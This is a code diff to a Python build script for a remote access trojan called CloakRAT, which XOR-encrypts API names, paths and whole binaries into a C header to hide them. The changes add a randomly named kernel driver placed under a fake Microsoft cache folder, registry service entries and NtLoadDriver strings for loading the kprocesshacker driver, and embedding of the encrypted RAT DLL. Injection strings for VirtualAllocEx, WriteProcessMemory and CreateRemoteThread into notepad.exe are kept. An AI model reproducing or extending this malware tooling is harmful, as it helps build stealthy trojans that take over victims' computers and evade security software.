@@ -1,4 +1,5 @@
 import secrets
+import string
 import os
 
 HEADER_NAME = 'encrypted_strings_autogen.h'
@@ -8,14 +9,23 @@ KEY_ENTROPY = 16  # bytes
 HEADER_XOR_KEY_VARIABLE_NAME = 'BUILD_TIME_KEY'
 HEADER_XOR_CIPHER_VARIABLE_NAME = 'BUILD_TIME_CIPHER_BYTE'
 
+# Randomize the driver name
+KPH_DRIVER_NAME = ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(8)) 
+KPH_DRIVER_PATH_ON_DISK = f'C:\\ProgramData\\Microsoft\\Windows\\Caches\\{KPH_DRIVER_NAME}.sys'
 
 # Add or modify strings here.
 strings_to_encrypt = {
     # General strings
     'str_ip': '127.0.0.1',
     'str_cmd': 'cmd.exe /C',
-    'str_dllPath': f'{CURR_DIR}\\x64\\Release\\CloakRAT.dll',
-    'str_procName': 'notepad.exe',
+    'str_dllPath': f'{CURR_DIR}\\x64\\Release\\CloakRAT.dll',  # USED BY OLD INJECTOR
+    'str_procName': 'notepad.exe', # USED BY OLD INJECTOR
+    'str_kphDriverPathOnDisk': KPH_DRIVER_PATH_ON_DISK,
+    'str_kphDriverNtPath': '\\??\\' + KPH_DRIVER_PATH_ON_DISK,
+    'str_servicesPath': f'SYSTEM\\CurrentControlSet\\Services\\{KPH_DRIVER_NAME}',
+    'str_serviceRegStr': f'\\Registry\\Machine\\System\\CurrentControlSet\\Services\\{KPH_DRIVER_NAME}',
+    'str_ImagePath': 'ImagePath',
+    'str_Type': 'Type',
     
     # Function names
     'str_NtSetInformationThread': 'NtSetInformationThread',
@@ -25,7 +35,13 @@ strings_to_encrypt = {
     'str_VirtualAllocEx': 'VirtualAllocEx',
     'str_WriteProcessMemory': 'WriteProcessMemory',
     'str_LoadLibraryA': 'LoadLibraryA',
-    'str_CreateRemoteThread': 'CreateRemoteThread',
+    'str_NtLoadDriver': 'NtLoadDriver',
+    'str_RtlInitUnicodeString': 'RtlInitUnicodeString',
+    'str_RtlAdjustPrivilege': 'RtlAdjustPrivilege',
+    'str_RegSetKeyValueA': 'RegSetKeyValueA',
+    'str_RegCreateKeyA': 'RegCreateKeyA',
+    'str_RegCloseKey': 'RegCloseKey',
+    'str_CreateRemoteThread': 'CreateRemoteThread',  # USED BY OLD INJECTOR
     'str_CloseHandle': 'CloseHandle',
     'str_LookupPrivilegeValueA': 'LookupPrivilegeValueA',
     'str_GetLastError': 'GetLastError',
@@ -78,6 +94,12 @@ strings_to_encrypt = {
     'str_WSAGetLastError': 'WSAGetLastError',
 }
 
+# Add files paths here.
+files_to_encrypt = {
+    'rat_dll_encrypted': f'{CURR_DIR}\\x64\\Release\\CloakRAT.dll',
+    'kprocesshacker_driver_encrypted': f'{CURR_DIR}\\kprocesshacker.sys'
+}
+
 def gen_key() -> list[int]:
         key = []
         for _ in range(KEY_ENTROPY):
@@ -103,7 +125,7 @@ def to_c_struct(variable_name: str):
 def to_c_array(variable_name: str, buffer: list[int]) -> str:
     # return in the format: "static unsigned char variable_name_DATA[] = { ...buffer };"
     elems = ', '.join(str(b) for b in buffer)
-    return f"static unsigned char {variable_name}_data[] = {{ {elems} }};"
+    return f"static uint8_t {variable_name}_data[] = {{ {elems} }};"
     
 
 def main():    
@@ -119,13 +141,13 @@ def main():
     
     # Generate the Header file
     with open(f'{HEADER_DIR}\\{HEADER_NAME}', 'w') as header_file:
-        c_style_byte_cipher = f"(unsigned char)((i % 4 | ((i {rand_op1} 9) {rand_op2} 2 + {HEADER_XOR_KEY_VARIABLE_NAME}[i % {HEADER_XOR_KEY_VARIABLE_NAME}.size()] & ((i/2)>>3) * i {rand_op3} {HEADER_XOR_KEY_VARIABLE_NAME}[i % {HEADER_XOR_KEY_VARIABLE_NAME}.size()]) << (i % 5)) & 0x7F ^ {rand_xor_value})"
+        c_style_byte_cipher = f"(uint8_t)((i % 4 | ((i {rand_op1} 9) {rand_op2} 2 + {HEADER_XOR_KEY_VARIABLE_NAME}[i % {HEADER_XOR_KEY_VARIABLE_NAME}.size()] & ((i/2)>>3) * i {rand_op3} {HEADER_XOR_KEY_VARIABLE_NAME}[i % {HEADER_XOR_KEY_VARIABLE_NAME}.size()]) << (i % 5)) & 0x7F ^ {rand_xor_value})"
         
         header_file.write('#pragma once\n\n')
         header_file.write('#include <array>\n\n')
         header_file.write(f'#define {HEADER_XOR_CIPHER_VARIABLE_NAME} {c_style_byte_cipher}\n')
         header_file.write(f'static std::array<uint8_t, {KEY_ENTROPY}> {HEADER_XOR_KEY_VARIABLE_NAME} = {{ {', '.join(str(b) for b in key)} }};\n\n')
-        header_file.write(f'typedef struct EncryptedBytes {{\n    unsigned char* data;\n    size_t length;\n}} EncryptedBytes;\n\n')
+        header_file.write(f'typedef struct EncryptedBytes {{\n    uint8_t* data;\n    size_t length;\n}} EncryptedBytes;\n\n')
         
         # Encrypt strings
         for var_name, string in strings_to_encrypt.items():
@@ -137,16 +159,14 @@ def main():
             header_file.write(encrypted_c_arr + '\n')  # Example: static unsigned char str_kernel32_data[] = { ... };
             header_file.write(c_struct + '\n\n')  # Example: static EncryptedBytes str_kernel32 = { str_kernel32_data, sizeof(str_kernel32_data) };
             
-        # Encrypt the RAT dll
-        with open(f'{CURR_DIR}\\x64\\Release\\CloakRAT.dll', 'rb') as rat_dll:
-            dll_bytes = rat_dll.read()
-            variable_name = 'rat_dll'
-            encrypted_c_dll_arr = to_c_array(variable_name, xor_encrypt(dll_bytes, key, byte_chiper))
-            
-            header_file.write(encrypted_c_dll_arr + '\n')
-            header_file.write(to_c_struct(variable_name) + '\n\n')
+        # Encrypt files (raw bytes)
+        for var_name, file_path in files_to_encrypt.items():
+            with open(file_path, 'rb') as file:                
+                raw_bytes = file.read()
+                encrypted_c_arr = to_c_array(var_name, xor_encrypt(raw_bytes, key, byte_chiper))
 
-            
+                header_file.write(encrypted_c_arr + '\n')
+                header_file.write(to_c_struct(var_name) + '\n\n')
 
 if __name__ == '__main__':
         main()
